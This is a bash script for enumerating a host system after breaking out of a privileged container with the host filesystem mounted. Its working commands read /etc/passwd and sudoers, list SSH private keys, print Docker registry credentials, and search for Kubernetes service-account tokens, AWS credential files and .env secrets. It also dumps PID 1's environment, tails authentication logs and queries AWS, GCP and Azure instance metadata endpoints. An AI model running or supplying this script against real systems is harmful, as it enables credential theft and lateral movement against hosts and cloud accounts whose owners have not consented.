#!/bin/bash
# Comprehensive Host System Enumeration
# Run from privileged container with /host mount

echo "=========================================="
echo "  COMPREHENSIVE HOST SYSTEM ENUMERATION  "
echo "=========================================="
echo ""

echo "[1] SYSTEM INFORMATION"
echo "----------------------"
echo "Hostname:"
chroot /host hostname 2>/dev/null || cat /host/etc/hostname 2>/dev/null
echo ""

echo "OS Release:"
cat /host/etc/os-release 2>/dev/null | head -10
echo ""

echo "Kernel Version:"
chroot /host uname -a 2>/dev/null || cat /host/proc/version 2>/dev/null
echo ""

echo "Uptime:"
cat /host/proc/uptime 2>/dev/null
echo ""

echo "CPU Info:"
cat /host/proc/cpuinfo 2>/dev/null | grep -E "(model name|processor)" | head -5
echo ""

echo "Memory Info:"
cat /host/proc/meminfo 2>/dev/null | head -5
echo ""

echo "[2] NETWORK CONFIGURATION"
echo "-------------------------"
echo "Network Interfaces:"
cat /host/proc/net/route 2>/dev/null | head -10
echo ""

echo "ARP Table:"
cat /host/proc/net/arp 2>/dev/null
echo ""

echo "Listening Ports (from /proc/net/tcp):"
cat /host/proc/net/tcp 2>/dev/null | awk '{print $2, $10}' | head -20
echo ""

echo "DNS Configuration:"
cat /host/etc/resolv.conf 2>/dev/null
echo ""

echo "[3] USERS AND GROUPS"
echo "--------------------"
echo "Users (/etc/passwd):"
cat /host/etc/passwd 2>/dev/null | head -20
echo ""

echo "Groups (/etc/group):"
cat /host/etc/group 2>/dev/null | head -20
echo ""

echo "Sudoers:"
cat /host/etc/sudoers 2>/dev/null 2>/dev/null | grep -v "^#" | grep -v "^$" || echo "  Cannot read sudoers"
echo ""

echo "Recent logins:"
chroot /host last 2>/dev/null | head -10 || echo "  Command not available"
echo ""

echo "[4] RUNNING PROCESSES"
echo "---------------------"
echo "Process count:"
ls /host/proc/*/exe 2>/dev/null | wc -l
echo ""

echo "Top processes (by PID):"
ls -lt /host/proc/*/cmdline 2>/dev/null | head -10 | while read line; do
    PID=$(echo $line | awk '{print $NF}' | cut -d'/' -f3)
    if [ -f /host/proc/$PID/cmdline ]; then
        CMD=$(cat /host/proc/$PID/cmdline 2>/dev/null | tr '\0' ' ' | head -c 80)
        echo "  PID $PID: $CMD"
    fi
done
echo ""

echo "[5] INSTALLED SOFTWARE"
echo "----------------------"
echo "Checking for package managers..."
echo "APT packages (if Debian/Ubuntu):"
chroot /host dpkg -l 2>/dev/null | head -20 || echo "  Not available"
echo ""

echo "RPM packages (if RHEL/CentOS):"
chroot /host rpm -qa 2>/dev/null | head -20 || echo "  Not available"
echo ""

echo "[6] DOCKER/KUBERNETES COMPONENTS"
echo "--------------------------------"
echo "Docker socket:"
ls -la /host/var/run/docker.sock 2>/dev/null || echo "  Not found"
ls -la /host/run/docker.sock 2>/dev/null || echo "  Not found (alt location)"
echo ""

echo "Containerd socket:"
ls -la /host/run/containerd/containerd.sock 2>/dev/null || echo "  Not found"
ls -la /host/var/run/containerd/containerd.sock 2>/dev/null || echo "  Not found (alt location)"
echo ""

echo "Kubernetes components:"
ls -la /host/var/lib/kubelet/ 2>/dev/null | head -10 || echo "  Kubelet not found"
ls -la /host/etc/kubernetes/ 2>/dev/null | head -10 || echo "  Kubernetes config not found"
echo ""

echo "Kubeconfig files:"
find /host -name "kubeconfig" -o -name "config" 2>/dev/null | grep -i kube | head -10
find /host -path "*/kube/config" -o -path "*/.kube/config" 2>/dev/null | head -10
echo ""

echo "[7] CREDENTIALS AND SENSITIVE FILES"
echo "------------------------------------"
echo "SSH keys:"
ls -la /host/root/.ssh/ 2>/dev/null | head -10 || echo "  No root .ssh directory"
find /host/home -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" 2>/dev/null | head -10
echo ""

echo "Docker credentials:"
cat /host/root/.docker/config.json 2>/dev/null | python3 -m json.tool 2>/dev/null || echo "  No Docker config found"
find /host/home -name ".docker" -type d 2>/dev/null | head -5
echo ""

echo "Kubernetes service account tokens:"
find /host -path "*/serviceaccount/token" 2>/dev/null | head -10
echo ""

echo "AWS credentials:"
find /host -name ".aws" -type d 2>/dev/null | head -5
find /host -name "credentials" 2>/dev/null | grep -i aws | head -5
echo ""

echo "Environment files with secrets:"
find /host -name ".env" -type f 2>/dev/null | head -10
echo ""

echo "[8] SCHEDULED TASKS"
echo "-------------------"
echo "Crontab:"
cat /host/etc/crontab 2>/dev/null || echo "  No system crontab"
echo ""

echo "User crontabs:"
ls -la /host/var/spool/cron/crontabs/ 2>/dev/null 2>/dev/null || echo "  Cannot access"
echo ""

echo "Systemd timers:"
chroot /host systemctl list-timers 2>/dev/null | head -10 || echo "  Cannot list timers"
echo ""

echo "[9] FILE PERMISSIONS"
echo "--------------------"
echo "SUID binaries:"
find /host -perm -4000 -type f 2>/dev/null | head -20
echo ""

echo "SGID binaries:"
find /host -perm -2000 -type f 2>/dev/null | head -20
echo ""

echo "World-writable files:"
find /host -perm -002 -type f 2>/dev/null | head -20
echo ""

echo "[10] MOUNTED FILESYSTEMS"
echo "-------------------------"
cat /host/proc/mounts 2>/dev/null | grep -v "^#" | head -20
echo ""

echo "[11] ENVIRONMENT VARIABLES"
echo "---------------------------"
echo "System environment (from /proc):"
cat /host/proc/1/environ 2>/dev/null | tr '\0' '\n' | head -20
echo ""

echo "[12] CLOUD PROVIDER METADATA"
echo "----------------------------"
echo "Checking AWS metadata (169.254.169.254):"
curl -s --max-time 2 http://169.254.169.254/latest/meta-data/ 2>/dev/null | head -5 || echo "  Not AWS or not accessible"
echo ""

echo "Checking GCP metadata:"
curl -s --max-time 2 -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/ 2>/dev/null | head -5 || echo "  Not GCP or not accessible"
echo ""

echo "Checking Azure metadata:"
curl -s --max-time 2 -H "Metadata: true" http://169.254.169.254/metadata/instance?api-version=2021-02-01 2>/dev/null | head -5 || echo "  Not Azure or not accessible"
echo ""

echo "[13] LOG FILES"
echo "--------------"
echo "Recent auth logs:"
tail -20 /host/var/log/auth.log 2>/dev/null || tail -20 /host/var/log/secure 2>/dev/null || echo "  Cannot access auth logs"
echo ""

echo "Recent syslog:"
tail -20 /host/var/log/syslog 2>/dev/null || tail -20 /host/var/log/messages 2>/dev/null || echo "  Cannot access syslog"
echo ""

echo "=========================================="
echo "  ENUMERATION COMPLETE"
echo "=========================================="
